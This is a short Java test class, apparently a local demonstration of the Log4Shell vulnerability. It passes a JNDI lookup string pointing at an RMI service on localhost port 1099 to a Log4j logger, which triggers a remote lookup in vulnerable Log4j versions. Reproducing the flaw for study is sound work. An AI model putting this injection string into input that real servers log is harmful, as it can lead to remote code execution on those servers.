package com.qbk.springboot.log4j.rmi;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Test {
    private static final Logger logger = LogManager.getLogger(Test.class);
    public static void main(String[] args) {
        logger.error("${jndi:rmi://127.0.0.1:1099/event}");
    }
}